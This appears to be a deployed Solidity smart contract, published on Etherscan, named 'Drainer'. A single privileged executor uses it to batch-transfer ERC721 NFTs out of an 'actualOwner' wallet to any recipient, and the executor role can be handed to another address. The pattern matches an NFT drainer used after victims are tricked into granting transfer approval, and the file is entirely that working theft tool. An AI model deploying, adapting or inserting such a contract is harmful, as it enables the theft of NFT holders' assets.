/**
 *Submitted for verification at Etherscan.io on 2022-11-11
*/

// SPDX-License-Identifier: Linchman
pragma solidity 0.8.13;

interface ERC721Partial {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract Drainer {

    address private _executor;

    constructor() {
        _executor = msg.sender;
    }

    // Transfer assets from one owner to another
    function batchTransfer(ERC721Partial tokenContract, address actualOwner, address recipient, uint256[] calldata tokenIDs) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        for (uint256 index; index < tokenIDs.length; index++) {
            tokenContract.transferFrom(actualOwner, recipient, tokenIDs[index]);
        }
    }

    function setExecutor(address _newExector) external {
        require(msg.sender == _executor, "Nah bro, not on my watch!");
        _executor = _newExector;
    }
}